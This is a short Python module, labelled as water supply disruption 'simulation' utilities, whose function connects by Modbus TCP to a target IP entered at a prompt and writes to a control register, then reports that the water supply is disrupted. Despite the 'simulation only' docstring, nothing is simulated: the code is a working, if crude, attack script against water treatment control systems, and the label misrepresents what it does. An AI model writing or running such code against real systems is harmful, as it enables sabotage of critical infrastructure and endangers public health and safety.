"""Water supply disruption simulation utilities."""

from __future__ import annotations

from typing import Optional

from .modbus_utils import ModbusTcpClient


def disrupt_water_supply(target: str, port: int = 502) -> Optional[bool]:
    """Attempt to disrupt a water treatment system endpoint (simulation only)."""
    client = ModbusTcpClient(target, port=port)
    try:
        client.connect()
        client.write_register(1, 1)
        print(f"Disrupted water supply at {target}")
    except Exception as exc:  # pragma: no cover - defensive logging path
        print(f"Error: {exc}")
        return None
    finally:
        client.close()


def main() -> None:
    """CLI entry point for manual testing."""
    target = input("Enter target IP: ")
    disrupt_water_supply(target)


if __name__ == "__main__":
    main()
